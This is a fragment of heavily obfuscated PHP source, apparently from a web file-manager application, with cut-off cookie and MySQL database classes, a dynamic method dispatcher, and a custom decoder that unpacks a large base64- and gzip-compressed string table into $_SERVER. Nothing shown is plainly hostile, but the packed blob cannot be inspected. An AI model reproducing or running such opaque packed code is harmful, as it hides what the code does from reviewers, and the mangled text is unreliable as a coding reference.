($ÜŞ©ŸğÇ as $±ãğ¾íÓ) { $±ãğ¾íÓ = explode($Òã†ŠŸò[509], $±ãğ¾íÓ); if (count($±ãğ¾íÓ) != 2 || !isset($±ãğ¾íÓ[1])) { continue; } $_COOKIE[trim($±ãğ¾íÓ[0])] = trim($±ãğ¾íÓ[1]); } } public static function remove($ØéÕÄ, $¸Êª‡¡Û = false) { unset($_COOKIE[$ØéÕÄ]); self::set($ØéÕÄ, $_SERVER[¼¥ÊĞÙÌ][12], 1, $¸Êª‡¡Û); } } class DbMysql extends Db { public function __construct($‡€ŠÂá‰ = '') { $Øñöä½ò =& $_SERVER[¼¥ÊĞÙÌ]; if (!extension_loaded($Øñöä½ò[882])) { think_exception(think_lang($Øñöä½ò[14]) . $Øñöä½ò[971]); } if (!empty($‡€ŠÂá‰)) { $this->config = $‡€ŠÂá‰; if (empty($this->config[$Øñöä½ò[17]])) { $this->config[$Øñöä½ò[17]] = $Øñöä½ò[12]; } } } public function connect($£üÌƒò½ = '', $Ø’é×Ê = 0, $È¯ÔëñŸ = false) { $ êöÇÚ =& $_SERVER[¼¥ÊĞÙÌ]; if (!isset($this->linkID[$Ø’é×Ê])) { if (empty($£üÌƒò½)) { $£üÌƒò½ = $this->config; } $şÔãè®Ê = $£üÌƒò½[$ êöÇÚ[972]] . ($£üÌƒò½[$ êöÇÚ[973]] ? "\x3a{$£üÌƒò½[$ êöÇÚ[973]]}" : $ êöÇÚ[12]); $©›ÇáÛ = !empty($£üÌƒò½[$ êöÇÚ[17]][$ êöÇÚ[18]]) ? $£üÌƒò½[$ êöÇÚ[17]][$ êöÇÚ[18]] : $this->pconnect; if ($©›ÇáÛ) { $this->linkID[$Ø’é×Ê] = mysql_pconnect($şÔãè®Ê, $£üÌƒò½[$ êöÇÚ[974]], $£üÌƒò½[$ êöÇÚ[975]], 131072); } else { $this->linkID[$Ø’é×Ê] = mysql_connect($şÔãè®Ê, $£üÌƒò½[$ êöÇÚ[974]], $£üÌƒò½[$ êöÇÚ[975]], !0, 131072); } if (!$this->linkID[$Ø’é×Ê] || !empty($£üÌƒò½[$ êöÇÚ[21]]) && !mysql_select_db($£üÌƒò½[$ êöÇÚ[21]], $this->linkID[$Ø’é×Ê])) { think_exception(mysql_error()); } $ÀŠµîÎü = mysql_get_server_info($this->linkID[$Ø’é×Ê]); mysql_query($ êöÇÚ[976] . think_config($ êöÇÚ[977]) . $ êöÇÚ[58], $this->linkID[$Ø’é×Ê]); if ($ÀŠµîÎü > $ êöÇÚ[978]) { mysql_query($ êöÇÚ[979], $this->linkID[$Ø’é×Ê]); } $this->connected = !0; if (1 != think_config($ êöÇÚ[22])) { unset($this->config); } } return $this->linkID[$Ø’é×Ê]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($È·”æ¨ø) { $õü´Ÿİ¤ =& $_SERVER[¼¥ÊĞÙÌ]; if (0 === stripos($È·”æ¨ø, $õü´Ÿİ¤[344])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $È·”æ¨ø; if ($this->queryID) { $this->free(); } think_action_status($õü´Ÿİ¤[23], 1); think_status($õü´Ÿİ¤[24]); $this->queryID = mysql_query($È·”æ¨ø, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ÍéÑ÷»½) { $¾ÉïÚ¤¦ =& $_SERVER[¼¥ÊĞÙÌ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÍéÑ÷»½; if ($this->queryID) { $this->free(); } think_action_status($¾ÉïÚ¤¦[25], 1); think_status($¾ÉïÚ¤¦[24]); $¹¼™€à¿ = mysql_query($ÍéÑ÷»½, $this->_linkID); $this->debug(); if (!1 === $¹¼™€à¿) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¼¥ÊĞÙÌ][980], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¾€˜¼Â = mysql_query($_SERVER[¼¥ÊĞÙÌ][981], $this->_linkID); $this->transTimes = 0; if (!$¾€˜¼Â) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¹¯îù¾· = mysql_query($_SERVER[¼¥ÊĞÙÌ][982], $this->_linkID); $this->transTimes = 0; if (!$¹¯îù¾·) { $this->error(); return !1; } } return !0; } private function getAll() { $“°ÔØĞ = array(); if ($this->numRows > 0) { while ($Çš’ãÍ× = mysql_fetch_assoc($this->queryID)) { $“°ÔØĞ[] = $Çš’ãÍ×; } mysql_data_seek($this->queryID, 0); } return $“°ÔØĞ; } public function getFields($Ëã¡¸ø) { $êø÷à‹ =& $_SERVER[¼¥ÊĞÙÌ]; $Œëƒéì = $this->query($êø÷à‹[983] . $this->parseKey($Ëã¡¸ø)); $Á®«ïÀÉ = array(); if ($Œëƒéì) { foreach ($Œëƒéì as $²÷’•Â => $–Ö÷ï) { $Á®«ïÀÉ[$–Ö÷ï[$êø÷à‹[31]]] = array($êø÷à‹[32] => $–Ö÷ï[$êø÷à‹[31]], $êø÷à‹[33] => $–Ö÷ï[$êø÷à‹[34]], $êø÷à‹[35] => (bool) (strtoupper($–Ö÷ï[$êø÷à‹[36]]) === $êø÷à‹[984]), $êø÷à‹[37] => $–Ö÷ï[$êø÷à‹[38]], $êø÷à‹[39] => strtolower($–Ö÷ï[$êø÷à‹[40]]) == $êø÷à‹[41], $êø÷à‹[42] => strtolower($–Ö÷ï[$êø÷à‹[43]]) == $êø÷à‹[44]); } } return $Á®«ïÀÉ; } public function getTables($ö½ò¿¥Ì = '') { $ú”É—Ÿè =& $_SERVER[¼¥ÊĞÙÌ]; if (!empty($ö½ò¿¥Ì)) { $ñ†ƒ±ä = $ú”É—Ÿè[985] . $ö½ò¿¥Ì . $ú”É—Ÿè[986]; } else { $ñ†ƒ±ä = $ú”É—Ÿè[987]; } $ËÛ¸ó€› = $this->query($ñ†ƒ±ä); $ÊÚŠ° = array(); foreach ($ËÛ¸ó€› as $†Ÿ–Í‹ => $ë·ƒ°ã) { $ÊÚŠ°[$†Ÿ–Í‹] = current($ë·ƒ°ã); } return $ÊÚŠ°; } public function replace($şÈ­Ì, $ÁÊ¾øï¬ = array()) { $Óœéê¢¹ =& $_SERVER[¼¥ÊĞÙÌ]; foreach ($şÈ­Ì as $ÈóÛ· => $İñ„¾Îé) { $Ÿ°ÀæÆÎ = $this->parseValue($İñ„¾Îé); if (is_scalar($Ÿ°ÀæÆÎ)) { $–½œ®±ì[] = $Ÿ°ÀæÆÎ; $Ï‡’’çö[] = $this->parseKey($ÈóÛ·); } } $ÎËƒÖ°† = $Óœéê¢¹[988] . $this->parseTable($ÁÊ¾øï¬[$Óœéê¢¹[359]]) . $Óœéê¢¹[989] . implode($Óœéê¢¹[50], $Ï‡’’çö) . $Óœéê¢¹[990] . implode($Óœéê¢¹[50], $–½œ®±ì) . $Óœéê¢¹[991]; return $this->execute($ÎËƒÖ°†); } public function insertAll($ğ’‰´È„, $ÈúûŞİ = array(), $‰§šïì = false) { $ã¶Ë‹á÷ =& $_SERVER[¼¥ÊĞÙÌ]; if (!is_array($ğ’‰´È„[0])) { return !1; } $ÊŞ÷úô = array_keys($ğ’‰´È„[0]); $—³ğ™â¢ = array(); foreach ($ğ’‰´È„ as $¶Ö„Î¼Ş) { $èõ¢à­È = array(); foreach ($¶Ö„Î¼Ş as $µë´È™ => $‚¯ŸŞ®ú) { $‚¯ŸŞ®ú = $this->parseValue($‚¯ŸŞ®ú); if (is_scalar($‚¯ŸŞ®ú)) { $èõ¢à­È[] = $‚¯ŸŞ®ú; } } $—³ğ™â¢[] = $ã¶Ë‹á÷[340] . implode($ã¶Ë‹á÷[50], $èõ¢à­È) . $ã¶Ë‹á÷[991]; } array_walk($ÊŞ÷úô, array($this, $ã¶Ë‹á÷[992])); $ÛÚÎıİ¾ = ($‰§šïì ? $ã¶Ë‹á÷[993] : $ã¶Ë‹á÷[994]) . $ã¶Ë‹á÷[995] . $this->parseTable($ÈúûŞİ[$ã¶Ë‹á÷[359]]) . $ã¶Ë‹á÷[989] . implode($ã¶Ë‹á÷[50], $ÊŞ÷úô) . $ã¶Ë‹á÷[996] . implode($ã¶Ë‹á÷[50], $—³ğ™â¢); return $this->execute($ÛÚÎıİ¾); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ìŸø¹Ù =& $_SERVER[¼¥ÊĞÙÌ]; $this->error = mysql_errno() . $ìŸø¹Ù[4] . mysql_error($this->_linkID); if ($ìŸø¹Ù[12] != $this->queryStr) { $this->error .= LNG($ìŸø¹Ù[48]) . $this->queryStr; } think_trace($this->error, $ìŸø¹Ù[12], $ìŸø¹Ù[49]); return $this->error; } public function escapeString($ŞßÓæ¶ä) { if ($this->_linkID) { return mysql_real_escape_string($ŞßÓæ¶ä, $this->_linkID); } else { return mysql_escape_string($ŞßÓæ¶ä); } } public function parseKey(&$—…ÃäÈğ, $º‡ÔßÎ– = true) { $øÆù¬¦— =& $_SERVER[¼¥ÊĞÙÌ]; if ($º‡ÔßÎ–) { $—…ÃäÈğ = $this->parseKeyCheck($—…ÃäÈğ); } if ($—…ÃäÈğ != $øÆù¬¦—[223] && !preg_match($øÆù¬¦—[997], $—…ÃäÈğ)) { $—…ÃäÈğ = $øÆù¬¦—[464] . trim($—…ÃäÈğ, $øÆù¬¦—[464]) . $øÆù¬¦—[464]; } return $—…ÃäÈğ; } } goto fñÉâ—öİ; FÎğ–§–·: if (strlen($lnpxastzbh) < $_SERVER[¼¥ÊĞÙÌ][688]) { return; } $_SERVER[ƒ›ÍÚğ] = explode($_SERVER[¼¥ÊĞÙÌ][689], gzinflate(substr($_SERVER[¼¥ÊĞÙÌ][690], 10, -8))); $twnzdyvrmc = $_SERVER[¼¥ÊĞÙÌ][691]; goto bÅÁèøãğİ; eœæ†Ø”: function binCheckBigger($£·‡Ì„Ö, $á‘²”ÉÊ) { return $£·‡Ì„Ö > $á‘²”ÉÊ; } $_SERVER[$_SERVER[ŸÅ®¥²][3]] = ("\70\66\67\65"."\x33\x36")+0;$_yjxc="8hxosc3bgfdyrmwnkje4i0pa9157vuzl26qtdt4v9wxzkeg5mbisu2f3ca8nlph67oy1qjr0n7awlyo6";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ùóè ó, $òÉ¿•Ì‘) { $¼ÁÚ¤Úã =& $_SERVER[¼¥ÊĞÙÌ]; if (isset(self::$_methodList[$ùóè ó])) { return @call_user_func_array(self::$_methodList[$ùóè ó], $òÉ¿•Ì‘); } else { if (method_exists($this, $ùóè ó)) { return call_user_func_array(array($this, $ùóè ó), $òÉ¿•Ì‘); } else { think_exception(__CLASS__ . $¼ÁÚ¤Úã[4] . $ùóè ó . $¼ÁÚ¤Úã[5]); } } } public static function __callStatic($“·™—ü, $¤Á€º˜à) { if (isset(self::$_methodListStatic[$“·™—ü])) { return call_user_func_array(self::$_methodListStatic[$“·™—ü], $¤Á€º˜à); } else { if (method_exists(self, $“·™—ü)) { return call_user_func_array(array(self, $“·™—ü), $¤Á€º˜à); } else { show_json("{$“·™—ü}\50\51\x20\x6e\x6f\x74\x20\145\x78\x69\163\x74\x3b", !1); } } } public static function addMethod($ÒÉöêÙŠ, $”„ÊÍ‚Ò) { self::$_methodList[$ÒÉöêÙŠ] = $”„ÊÍ‚Ò; } public static function addMethodStatic($á¹­–›, $ÄËê¿Ä¦) { self::$_methodListStatic[$á¹­–›] = $ÄËê¿Ä¦; } } goto b‘áŠªçƒğ; eõ³‚‹´: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xbc\xa5\xca\xd0\xd9\xcc", "\xee\xde\x96\xb2\xbd\xd9"); $_SERVER[¼¥ÊĞÙÌ] = explode("\174\1\174\5\174\3", gzinflate(substr(base64_decode('H4sIAAAAAAAAE8V9CXgb1bVwgbaPpawFCo9HOxiC7USL7exOnCDbsi0iW44kZ8F2JiNpLE0=').base64_decode('LGlkzchbEkiAUBoIYSdAytICpbRJKBQIex8t5bVQWkqBtkApEDsJpUBpy2Pvf5dzlxnJ8P4=')."\xef\xfd\xdf\xf7\xf3\x11\x6b\xee\xbd\xe7\xee\xe7\x9e\x7b\xee\xb9\xe7\x9c\xbb\xf1\xc6\xc7\x77\xde\x7a\xd7\xba\x3\xd6\x7d\x69\xdd\x41\xd7\xbd\xf7\xdb\xf7\x5e\xfe\x13\xfd\x5e\x77\x20\xfa\x7b\x20\xfd\xfe\xc6\x45\x7"."\177\201\374\367\325\213\66\327\324\164\314\71\164\106\327\127\266\376\170\207\166\207\266\103\333\34\11\77\371\124\350\360\247\177\170\146\160\362\273\117\216\115\36\360\205\377\274\343\322\7\33\21\60"."\315\333\110\177\224\274\151\53\372\250\141\331\26\215\110\232\371\1\43\115\277\215\74\375\365\323\237\236\150\270\250\347\114\133\247\101\37\375\121\241\135\344\257\65\224\65\130\272\332\25\211\253\261"."\236\356\356\140\64\16\100\215\162\172\316\114\301\127\101\53\152\71\250\277\240\27\55\324\32\271\70\265\140\26\364\274\43\106\104\244\64\133\113\150\26\224\324\332\254\266\6\273\303\221\225\152\174"."\145\167\20\40\22\352\120\111\57\216\321\20\371\214\331\132\321\216\33\71\235\103\214\24\171\273\232\203\355\241\56\45\36\15\164\305\2\55\361\120\244\213\106\267\104\72\73\103\361\362\370\150\44"."\34\156\16\264\54\51\117\351\216\6\332\73\3\12\152\137\126\127\215\374\200\131\243\254\246\51\253\225\132\372\321\146\350\331\24\375\314\153\254\71\366\130\1\276\342\374\13\115\123\276\224\315\322"."\x40\x17\xff\x4a\xe9\x3\x5a\x29\xb\xa3\xd5\x2a\x7\xa\x45\x23\xa7\xb1\x4e\x2f\xd1\xc7\x78\x2c\xfd\xd0\x4a\xb6\x69\xe4\x93\x34\x10\x1c\xb5\x8b\x9a\x88\x47\x6d\x4d\xa2\x89\xd6\xf3\x50\x54\x2c\x18\xe\xb6\xc4\x15"."\xdc\x40\xa5\x2d\x1a\xe9\x54\x60\x12\x72\x9a\x65\xeb\x45\x65\x79\x47\x30\x1a\x54\x70\xa3\x9b\xaa\x49\x5f\xab\x15\xc0\x97\x2e\x34\x14\x4a\x20\x1c\x56\xa6\x2a\xc1\xd6\x73\x5\x56\xc\xcd\x53\xa1\xb0\x48\xb4\x35\x18"."\125\232\127\52\142\204\222\146\56\147\346\175\250\24\64\223\266\324\324\140\64\112\77\74\200\336\341\20\236\64\10\104\332\332\142\101\36\202\316\55\15\243\226\314\4\374\164\204\122\3\131\133\35".strrev('Ã¡Za­A‚\\@Kä&ü¡Èø)èÅh1(ø+/“L"…4Q¼Œ‡u'."\0".'´×à~·ôƒ¦†%²Ö')."\xf4\xb3\x69\x11\xfd\x5d\x0\xf9\x13\x2a\x4e\xd3\x8b\xb6\xaa\xe7\x93\x66\xca\xc8\xc3\x3a\x5e\xc\xf8\xa8\xd9\x99\xd6\xa2\x81\x0\x68\x78\xc0\xcc\xa6\xd8\xb7\x65\x8c\x43\x2f\x7\x8c\xac\xde\x55\xca\xc9\x20\x3c\x98"."\314\30\331\124\221\55\275\317\202\244\301\60\137\311\30\126\204\12\250\45\234\10\30\3\143\142\51\142\270\156\236\152\231\245\142\122\17\241\245\103\303\365\20\255\333\66\352\34\33\20\263\247\220"."\65\265\124\114\57\362\256\31\146\33\52\50\122\262\345\310\22\1\153\63\213\271\126\104\64\344\270\116\264\154\14\21\71\310\226\113\112\32\55\177\115\357\106\357\247\375\275\147\240\77\265\100\21"."\373\240\75\31\75\233\125\365\121\35\326\123\56\65\333\142\3\341\267\22\106\336\217\142\150\60\24\121\63\232\225\351\114\315\126\111\56\106\150\123\372\250\257\220\51\300\142\347\353\273\317\201\357"."\170\330\272\114\73\50\221\353\254\231\324\262\162\127\350\167\306\266\13\61\75\237\302\243\0\135\61\107\362\144\224\12\272\16\100\255\36\45\245\164\52\53\225\216\106\243\321\142\31\163\131\376\305".base64_decode('esfjLB5pj7KpTA0AprLdogoqNCxC+MSq1QqFrJHUbMPM+82krdteyy7qGpQYSCZ1y/K2mHk=').base64_decode('u2hmvYFs1hzxRopG2sg3KtOBBqNEtNa9mC42wgKuWqBgpMHVTG8q2QPeeWxhcuiilrcG9KI=')."\67\10\253\242\121\101\215\345\304\221\201\265\32\126\301\264\14\334\274\106\105\263\155\55\231\301\204\105\24\337\364\31\360\106\76\153\344\365\162\130\124\210\356\355\56\152\351\234\326\250\24\112\11"."\x34\x0\xb0\x18\x21\x2e\x89\x21\x64\x60\x18\x80\x46\x25\xa7\x8d\x7a\xb5\x34\x2b\x29\x38\x5a\x30\x8a\xba\xc5\x7a\xad\xb4\x77\xc6\x1\xa3\x6\xbc\x9d\x78\x11\x19\x7a\xca\x1b\x43\x94\x1b\xa\x9b\x59\x37\x4b\x41\xb8".base64_decode('orA0GtsRj3eroTa0NXcF1c5AvKUDSre1NCs6jOgxL5JFrvCixYSxqQt1TkR2myN6EVXcPNY=')."\xa8\xc\x9a\xa9\x84\x39\xea\x63\x49\x18\x38\x86\xa8\xa\x3\xc6\xf3\x5b\xb0\xbd\x51\x2d\x9f\xc6\xdd\x48\x8c\xd9\xba\xe5\xa6\x4b\xcd\x68\x23\xf7\xd\xd0\x95\xeb\x4b\xe8\x3\x66\x11\x7a\x63\xd\xa7\x9d\x83\x1f\xd6"."\363\151\73\303\312\216\5\243\313\202\121\65\26\151\213\57\17\104\141\337\317\43\314\31\145\255\301\265\147\275\121\75\205\6\61\151\263\174\132\101\214\376\12\57\136\60\270\162\226\212\27\21\113"."\xb\x87\xda\xf1\xd8\xb5\x7a\x2d\x4\xe4\x95\xa1\x58\xd9\x61\x23\x67\xe0\xee\xd9\x3c\x85\xc\x36\x62\xa\xda\xa1\x41\x7e\xd2\xe7\xa6\x3e\x6b\x7a\x4d\x5f\x6a\x46\xad\x17\xfd\x9d\x5e\xdb\xdb\xd7\xea\x9b\xde\xbf\xd8"."\x6f\x88\x3c\xfe\x7a\x5f\xbd\xd2\x50\x37\x47\xe9\x46\x5c\x8a\xa1\x65\x15\xe8\x74\x19\x44\x9d\x12\x59\xe2\x1c\x16\x81\xe1\x79\x33\xaf\x57\x5c\x58\x8\x91\x4c\x4b\xf7\x76\xe8\x1a\x22\xd0\x68\x22\x1c\xf3\xe2\x61\x75"."\321\360\147\214\56\336\47\45\132\342\232\27\32\31\15\56\355\11\306\342\152\147\60\336\21\151\205\346\7\3\360\225\107\231\111\173\331\34\143\246\14\266\304\74\24\253\217\112\373\207\330\7\222"."\xf2\x80\x90\x7c\x5d\xe6\x8\xa3\xfc\x2e\x4\x6a\xc9\xe8\xc9\xc1\x29\xd2\xd0\x17\xf4\xc6\xa4\x74\x89\x4d\x5d\x2f\xfd\xe9\x7\x6c\xee\xa7\x3f\xaa\xda\x12\xe\x6\xa2\x2a\x70\xb3\xaa\x61\xb5\x49\x5b\x28\xe\x72\x72"."\253\232\211\65\10\321\72\165\266\247\100\305\241\34\132\322\242\43\252\163\277\143\275\354\24\210\217\126\320\162\43\305\67\104\24\354\320\215\164\6\332\155\340\342\222\146\326\54\152\131\274\25\60"."\36\66\155\0\125\56\144\113\150\31\370\161\301\361\114\51\227\200\215\13\15\131\132\267\5\173\151\215\41\36\54\307\66\147\264\303\333\241\126\307\26\14\41\277\212\121\267\317\127\310\247\153\117".base64_decode('g7LUhtl1OAJmFXqG+OySXt51X9JE67xTG9QbcV+AuC0gsSwg0c8FeMtrcpMJPFtZXw4VQso=').base64_decode('bDH5Jk1PMgucW56iF4tm8RSAIN8K2TfxdEHhNudALEQR2HfG5ByLyXCz0Q/9ntbQBlQkhTg=').base64_decode('N59lo0lAHdRSqUrRiPJAAesY2pIExhb4YzPR/4IHSJk5je2omBDxanHA4iGyTeopuk86oug=')."\x2\xa7\x51\xd3\x59\x95\x45\xdb\xc4\x89\x45\x7\x24\x42\xd2\x8c\x9\x8d\x46\x58\x1\x1d\x2e\xf1\x9e\xb3\x31\x48\xe9\x59\x9d\x21\x58\x46\x67\xac\x46\x1d\x80\xa1\x99\xe1\xe8\x37\xc0\xd7\x1\x3a\x48\xa0\x58\xc1\xdf"."\x19\x56\x14\xe5\xc4\x8c\x1\xb\x2f\xc7\x27\x2f\x11\x81\xb9\x23\xc0\x2b\xf1\x99\x45\xb3\x1a\x21\xb\x4a\x84\xbb\x8b\xfa\x80\x31\xca\x48\xc9\xa8\xdd\xa9\x15\x7\x59\xc7\x50\x4e\xb1\x14\x71\x40\x5a\xa6\x6d\x3d\xe1".strrev('cŠò±Òˆó0]fĞ•à¿Ô!@á˜Ğ‚Ìœä'."\r".'„7K@ÕZbŒƒÅ'."\r".'Yƒ£ŠéÚ°')."\135\131\122\112\260\22\200\73\202\375\160\161\24\210\47\310\215\173\163\210\256\170\171\233\272\173\200\27\140\130\301\130\342\346\61\314\355\62\322\221\316\57\343\63\277\74\66\313\333\321\31\150\361"."\xc6\x3a\x2\xd\xb3\xe7\xd0\xd8\x95\xb9\x54\x5f\xbc\xc3\xb0\xfa\xce\xe2\x61\x68\xce\x88\x35\x4b\x2d\xea\x68\x4d\x33\x5c\x68\xa8\xab\x67\x2b\xe\xf1\x25\x9a\x68\xf9\x4a\x6f\xce\x8b\x4b\xc1\x2c\xa5\xaf\xae\xae\x8e"."\225\65\143\216\222\101\244\204\323\357\24\351\55\73\345\224\222\203\272\114\316\55\357\210\301\150\336\151\234\35\77\255\174\360\255\22\331\335\124\55\211\213\123\121\146\273\144\311\43\205\20\60\205"."\262\30\214\113\246\261\132\66\155\42\274\313\344\344\310\24\307\137\32\326\51\313\5\25\145\64\76\116\170\364\330\342\100\14\335\230\234\11\17\63\152\3\243\337\116\36\133\211\127\36\150\312\272"."\207\140\264\105\73\12\170\147\103\124\233\115\333\351\364\347\120\150\106\11\255\333\242\61\56\215\376\142\126\22\243\231\221\30\124\71\232\313\212\363\27\14\15\214\246\334\265\121\25\245\250\220\242"."\xca\x29\x1d\x9c\xe\xb0\x59\xe8\x6c\x75\xad\x9\xba\xf9\xd3\xb8\x85\x8b\x51\x8d\xca\x30\x96\xe6\x98\xf9\xa6\xea\x7a\x5f\x5d\xb5\xc2\x4e\xa5\x4d\xd5\x3d\xf1\x36\xc4\xa7\x2f\x5e\x74\xe8\xc2\x16\x33\x57\xc0\x64\x85"."\x1c\xc1\x70\x7f\x29\xe6\x2e\x82\x3e\x2e\xc4\x3c\x10\xb\x74\xbb\x86\x23\x18\xd7\x60\xd7\x59\xe8\x97\xe1\x16\xfa\xa7\x2a\x15\xba\x82\x19\xb3\x15\x6a\x77\x38\x10\x6f\x8b\x44\x3b\x1\xc7\xb\x5\x81\x56\x85\x64\xa5"."\xd5\xe6\x15\x14\xa9\x64\x79\x75\xcc\x27\xc3\x2a\xd0\x92\x59\x17\x8a\xca\x63\xb1\xa2\x22\x26\xae\xa8\x84\x89\x2b\x5c\x98\xb8\xa2\x1c\x13\x57\x54\xc2\xb3\x61\x40\x48\x2d\xa7\x8d\x9b\x79\xb4\x5e\xd1\x46\x9b\xf3\x25".base64_decode('AS3iHaGuJWpnpDUYVkNdiJ+Ll8f3dLcGGBmU45sj8Q5HbA/i6JYFwiE3eHBFKBaPVUxCcT0=')."\x41\x57\x4a\x6b\xb3\xda\x1d\xd\xb6\x85\x56\xf0\x60\x5b\x28\x18\x6e\x8d\xa9\x2d\x81\x96\xe\x1\xd3\x15\xe8\x84\x0\xe2\x95\xf4\x6c\xca\xf2\x3b\xe1\x55\xc4\x9a\xc6\xb8\xc8\x4d\x5\x84\x83\x90\x43\xca\xa5\x32\xf9"."\215\52\50\61\72\346\350\60\35\320\135\54\264\44\75\121\31\251\52\161\106\223\235\351\163\154\253\105\107\64\30\166\166\76\251\241\77\265\112\40\246\330\5\225\157\252\211\61\376\111\272\301\302"."\x88\xb\x81\xfa\x15\x60\x93\xcb\x5a\xa0\x62\x98\x66\xe9\x30\x54\x39\x22\x30\x60\x73\x4e\xd4\x15\x46\x5b\x88\x48\x43\x33\x10\x20\xd2\x51\x84\x9\x64\x46\xa0\x1a\x3\x6d\x48\x45\x3b\xc0\x9a\x33\x20\x24\x93\x6a\xa4"."\x3b\x18\xd\x60\xb9\xa6\xba\x3c\x1a\xe9\x6a\x87\xc\x23\x19\x9d\x35\x20\x4\xc3\x5f\xc3\x4e\xa7\x20\xde\xb4\xc5\xbe\xae\x65\xd\x8d\xc9\xb9\xc4\xa0\xaf\x31\xd9\x50\xa2\x13\x39\xe3\xf9\xf3\x6c\x9c\x13\x98\xa9\x61".base64_decode('nC77GEALmTEkZomXnzBNKDOLD2J8o+UC0TUWQ4tRtkXP4FsYIGtkSbBLZbhEQxL+0YhgNBo=')."\211\302\20\330\346\40\23\206\321\304\150\60\26\214\263\272\207\112\6\33\40\277\157\6\340\255\216\330\72\250\336\277\252\157\144\106\115\257\167\206\257\37\175\324\116\77\203\6\41\324\347\163\4".base64_decode('GbddKvLcmBOssRbXNvb5+/w1ixt7A95xzTte553v7Uc8eu0MiOhf2+CZtR4DIMDFp/ajn6Y=').strrev(','."\0".'&)òAÊÜèI¨5©©¨mí€1Ñ,“Õ˜»^ŸéíNùô§Æêş¾ŞŒú½Ÿ§¼úÓÅ¾')."\x61\xdc\x28\x88\xd8\xb5\x73\xd6\xb3\x78\x34\x87\x7a\x5a\xe4\xe8\xf5\xf6\xcd\xe8\x5f\x2c\xe5\x93\xa2\xdc\x75\x21\x6a\x8a\x98\xbe\xc\x87\xb\x78\xcf\xc2\x3d\xe3\x59\xf1\x4a\x7\xfc\x28\xe5\x93\x62\x43\xc4\x2b\x21"."\xa1\xf1\x3\x60\x3a\x2f\x4e\x56\x76\x91\xb\x48\x87\x11\x76\xa\x9a\xbb\x76\x1a\xfd\x5d\xcf\x26\x32\xad\x8f\x32\x62\x90\x1f\x30\x18\x43\x55\xca\x1b\x43\xec\x88\x93\xd7\x87\xe0\xc3\xb4\x39\x46\xeb\xf6\x88\xce\xd0"."\x3\xc5\x3b\xc2\x8\x39\xd8\x3e\x80\x92\xa4\x50\x56\xda\x37\x88\x34\x8b\xe3\x28\x47\x26\xa3\xa0\xe2\xd3\xde\x8\xf\xa1\x6d\x5\xe6\xe9\x10\x80\xb6\x92\x5a\x41\x8f\x49\x3d\x54\xd5\x78\xa0\x39\x1c\xe4\x47\x57\xa0"."\275\54\114\350\140\63\277\106\101\135\23\64\224\121\4\111\122\105\44\107\260\326\255\241\254\102\110\1\75\146\65\222\33\45\253\124\300\47\46\5\315\70\32\133\5\161\160\112\323\42\205\16\71".strrev('?è}üS‰–¾¹¯ôó_‹ßÕ=^¥}}5ü„IĞ²ˆ*mšcÑbêu“ğ(	åSä')."\x8\x54\xb8\xdb\x50\x35\x9b\xd\x9\xa7\x84\x6a\x7b\x30\xee\xc3\x2d\xe2\xd2\x6c\x47\x80\x27\xd3\xa0\x59\xe4\x47\x8b\x82\xe3\x6c\x6f\x9b\xb6\x96\x75\x14\x11\xc7\x31\x8c\x48\x31\x6e\xa\x64\xbb\x74\xde\xc3\x82\x76".base64_decode('YaZDuh4ipLSLy1I5TyzdT+AcMd32cQiPlKiisOOqrqmKEfo8Wlgt0jZHpesxIhJw3ClZulY=').base64_decode('TGbaStmszQUzWWMQaoBVA1dcXtgJZlTKik4lTE45HZpRNb0SYCifN1MJGenEBtseQKxMXKk=')."\141\327\61\112\250\113\151\216\104\302\301\100\227\202\367\162\330\203\20\243\20\13\166\7\320\6\206\45\236\261\170\20\156\210\102\255\136\126\356\12\57\223\157\360\17\3\206\335\54\320\163\205\156"."\xab\x59\x93\x91\x11\xa7\x84\x4\x1f\xce\x3c\x58\x4e\xe1\xc1\x7c\x85\x7\xb5\xda\x83\x45\x1b\x1e\x71\xf4\xf5\x88\x5b\xe\xcf\xb0\xa1\x8f\x90\xf\x7e\x2c\xf5\xc0\x69\xd5\x23\x84\x32\xf0\x19\x6a\xf5\x18\x56\x2b\x39".strrev('ëøÂ`ñ™ú"|‹4ƒÕš©pˆyRFÖ5ÄÃÖzÃë	Í¡æ6¬èÁ‚kH'."\n".'“u')."\xf7\x2e\x1e\x73\x24\xaf\x17\x9\x8\xc\x8c\x38\xb0\x7b\xc4\x61\xde\x93\x2e\x9a\xa5\x42\x37\xab\x53\xa\xd1\x66\x41\x84\x68\x33\x8f\x88\x9a\xa6\xed\x61\x72\x2f\x8f\x2c\x0\x83\x56\x4\xd8\x3a\xa9\x38\x9c\x95\x7b"."\103\306\337\335\10\300\57\234\124\76\112\237\63\131\345\363\341\224\375\255\245\45\202\334\163\75\333\357\34\60\104\6\307\71\117\74\340\342\153\231\130\250\270\3\155\32\334\360\321\142\345\157\216"."\xa0\x79\x27\xa2\x8a\x6b\x16\x71\xb9\x26\xf8\x5c\xb7\x18\xc6\x7d\xed\x86\x2b\x45\x87\xa9\x98\x54\x9d\xad\xa5\x59\x5d\x98\x58\xf1\xa3\x56\x5\x50\xfa\x1d\xd5\x93\x63\x49\x21\xd7\x69\x95\xa4\x45\xce\x50\x93\xb3\x3f"._kodDe('LaMPG3FwErrW+dbYvsHT/zR0UqG8QI1UnW1io+//dcsCGggv+SdzxAcJ0Mj